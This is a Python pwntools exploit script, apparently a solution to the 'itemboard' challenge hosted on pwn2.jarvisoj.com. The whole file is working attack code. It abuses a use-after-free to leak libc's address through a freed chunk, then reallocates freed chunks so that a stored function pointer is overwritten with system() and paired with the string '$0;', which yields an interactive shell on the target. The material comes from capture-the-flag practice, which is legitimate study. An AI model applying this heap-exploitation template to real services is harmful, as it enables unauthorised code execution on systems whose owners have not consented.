#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import roputils as rp
import os
import sys

elfPath = "./itemboard"
libcPath = "./libc-2.19.so"
remoteAddr = "pwn2.jarvisoj.com"
remotePort = 9887

context.binary = elfPath
elf = context.binary
if sys.argv[1] == "l":
    io = process(elfPath)
    libc = elf.libc
    main_arena = 0x3b4c40

else:
    if sys.argv[1] == "d":
        io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    else:
        io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)
    main_arena = 0x3be760
    one_gadget = 0x4647c

context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    gdb.attach(io, cmd)

def add(name, length, des):
    io.sendlineafter(":\n", "1")
    io.sendlineafter("?\n", name)
    io.sendlineafter("?\n", str(length))
    io.sendlineafter("?\n", des)

def show(idx):
    io.sendlineafter(":\n", "3")
    io.sendlineafter("?\n", str(idx))

def remove(idx):
    io.sendlineafter(":\n", "4")
    io.sendlineafter("?\n", str(idx))


if __name__ == "__main__":
    add('0000', 0x90, '0000')
    add('1111', 0x20, '1111')
    remove(0)
    show(0)
    libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - 88 - main_arena
    success("libc", libc.address)

    add('2222', 32, '2222')
    add('3333', 32, '3333')
    remove(2)
    remove(3)
    #  DEBUG([0xEF6, 0xE1B, 0xE37], True)
    add('4444', 24, '$0;'.ljust(16, '0') + p64(libc.sym['system']))
    remove(2)
    
    io.interactive()


